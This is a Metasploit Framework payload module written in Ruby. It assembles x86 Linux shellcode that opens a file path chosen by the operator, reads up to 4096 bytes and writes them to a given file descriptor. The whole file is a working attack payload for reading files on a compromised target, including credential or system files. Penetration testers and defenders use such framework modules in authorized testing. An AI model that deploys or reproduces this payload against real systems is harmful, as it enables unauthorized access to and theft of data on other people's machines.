##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 63

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Read File',
      'Version'       => '',
      'Description'   => 'Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor',
      'Author'        => 'hal',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86))

    # Register exec options
    register_options(
      [
        OptString.new('PATH',   [ true,  "The file path to read" ]),
        OptString.new('FD',     [ true,  "The file descriptor to write output to", 1 ]),
      ])
  end

  def generate_stage(opts={})
    fd = datastore['FD']

    payload_data =<<-EOS
      jmp file

      open:
        mov eax,0x5       ; open() syscall
        pop ebx           ; Holds the filename
        xor ecx,ecx       ; Open for reading (0)
        int 0x80

      read:
        mov ebx,eax       ; Store the open fd
        mov eax,0x3       ; read() syscall
        mov edi,esp       ; We're just going to save on the stack
        mov ecx,edi       ; Save at edi
        mov edx,0x1000    ; Read as much as we can
        int 0x80

      write:
        mov edx,eax       ; Number of bytes to write
        mov eax,0x4       ; write() system call
        mov ebx,#{fd}     ; fd to write to
        int 0x80

      exit:
        mov eax,0x1       ; exit() system call
        mov ebx,0x0       ; return 0
        int 0x80

      file:
        call open
        db "#{datastore['PATH']}", 0x00
    EOS

    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
  end
end
